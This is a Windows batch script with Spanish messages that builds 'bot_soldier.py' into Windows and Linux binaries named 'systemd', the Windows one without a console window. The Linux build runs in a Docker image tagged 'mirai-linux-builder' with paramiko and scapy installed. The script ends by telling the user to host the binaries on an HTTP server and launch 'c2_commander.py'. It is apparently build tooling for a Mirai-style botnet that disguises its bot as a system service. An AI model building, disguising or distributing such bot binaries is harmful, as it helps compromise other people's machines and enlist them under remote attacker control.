@echo off
cls
echo ========================================
echo   COMPILACION UNIVERSAL - MULTI-PLATAFORMA
echo ========================================
echo.
echo Este script compilara el bot para:
echo   [1] Windows x64 (.exe)
echo   [2] Linux x64 (ELF)
echo.
echo Requisitos:
echo   - Python 3.x instalado
echo   - Docker Desktop (para Linux)
echo.
pause
echo.

REM ============================================
REM PASO 1: Compilar para WINDOWS
REM ============================================
echo.
echo ========================================
echo   PASO 1: COMPILANDO PARA WINDOWS
echo ========================================
echo.

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python no encontrado
    pause
    exit /b 1
)

echo [*] Limpiando builds anteriores...
rd /s /q build dist 2>nul
del systemd.spec 2>nul

echo [*] Instalando PyInstaller...
pip install --quiet pyinstaller

echo [*] Compilando bot para Windows...
pyinstaller --onefile --noconsole --name systemd bot_soldier.py

if not exist "dist\systemd.exe" (
    echo [!] Error: No se creo el ejecutable Windows
    pause
    exit /b 1
)

echo [+] Binario Windows creado: dist\systemd.exe
dir dist\systemd.exe | findstr /C:"systemd"

REM Copiar a directorio bots
if not exist "bots\windows\x64" mkdir "bots\windows\x64"
copy /Y "dist\systemd.exe" "bots\windows\x64\systemd.exe" >nul
echo [+] Copiado a: bots\windows\x64\systemd.exe
echo.

REM ============================================
REM PASO 2: Compilar para LINUX
REM ============================================
echo.
echo ========================================
echo   PASO 2: COMPILANDO PARA LINUX
echo ========================================
echo.

docker --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Docker no encontrado - Saltando compilacion Linux
    echo [*] Para compilar Linux, instala Docker Desktop
    goto :FINISH
)

echo [*] Docker encontrado, compilando para Linux...
echo.

REM Crear directorio
if not exist "bots\linux\x86_64" mkdir "bots\linux\x86_64"

REM Crear Dockerfile
(
echo FROM python:3.11-slim
echo WORKDIR /app
echo RUN apt-get update ^&^& apt-get install -y gcc binutils ^&^& rm -rf /var/lib/apt/lists/*
echo COPY bot_soldier.py /app/
echo RUN pip install --no-cache-dir pyinstaller paramiko netaddr cryptography scapy
echo RUN pyinstaller --onefile --name systemd --strip --clean bot_soldier.py
echo CMD ["cp", "/app/dist/systemd", "/output/systemd"]
) > Dockerfile.build

echo [*] Construyendo imagen Docker...
docker build -t mirai-linux-builder -f Dockerfile.build . >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Error construyendo imagen Docker
    del Dockerfile.build 2>nul
    goto :FINISH
)

echo [*] Compilando binario Linux...
docker run --rm -v "%cd%\bots\linux\x86_64:/output" mirai-linux-builder
if %errorlevel% neq 0 (
    echo [!] Error compilando binario Linux
    del Dockerfile.build 2>nul
    goto :FINISH
)

if exist "bots\linux\x86_64\systemd" (
    echo [+] Binario Linux creado: bots\linux\x86_64\systemd
    dir "bots\linux\x86_64\systemd" | findstr /C:"systemd"
) else (
    echo [!] Binario Linux no se creo correctamente
)

del Dockerfile.build 2>nul
echo.

REM ============================================
REM FINALIZAR
REM ============================================
:FINISH
echo.
echo ========================================
echo   COMPILACION COMPLETADA
echo ========================================
echo.

if exist "bots\windows\x64\systemd.exe" (
    echo [OK] Windows x64: bots\windows\x64\systemd.exe
) else (
    echo [FALTA] Windows x64
)

if exist "bots\linux\x86_64\systemd" (
    echo [OK] Linux x64:   bots\linux\x86_64\systemd
) else (
    echo [FALTA] Linux x64
)

echo.
echo Proximos pasos:
echo   1. Copia los binarios al servidor HTTP
echo   2. Ejecuta: start_binary_server.bat
echo   3. Ejecuta: python c2_commander.py
echo   4. Ejecuta: test_binary.bat
echo.
pause
